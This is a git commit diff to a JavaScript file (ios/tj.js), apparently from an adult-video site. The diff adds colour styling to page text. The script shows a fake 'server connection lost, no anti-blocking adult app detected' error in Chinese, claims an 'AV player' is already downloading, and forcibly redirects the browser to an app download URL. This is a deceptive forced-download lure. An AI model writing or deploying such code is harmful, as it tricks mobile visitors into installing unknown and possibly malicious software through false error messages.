8e03f1f2a9caa513ce1ee3ba023b3093868c789f
aifuli <aifuli@users.noreply.github.com>
2015-02-08 22:59:03 +0800

    Update tj.js

--- ios/tj.js
+++ ios/tj.js
@@ -10,7 +10,7 @@ function count(){
 		setTimeout("count()",100);
 	}else{
 		alert(tixing);
-		document.getElementById('load').innerHTML='<a href="'+appurl2+'"><span style="height:25px;line-height:25px;font-size:13px;color:#c3c3c3;">服务器连接断开：系统未检测到防屏蔽手机专用APP！高清内容，缓冲快，点击下载！</span></a>';
+		document.getElementById('load').innerHTML='<a href="'+appurl2+'"><span style="height:25px;line-height:25px;font-size:13px;color:#c3c3c3;">服务器连接断开：系统未检测到<span style="color:#FF0033;">防屏蔽成人</span>手机专用APP！<span style="color:#339900;">高清内容，缓冲快，点击下载！</span></span></a>';
 		document.getElementById('note').innerHTML='<div style="height:25px;line-height:25px;font-size:13px;color:#00FF00;">AV播放器下载中，请耐心等待，一会提醒您安装...</div>';
 		window.location.href=appurl2;
 	}
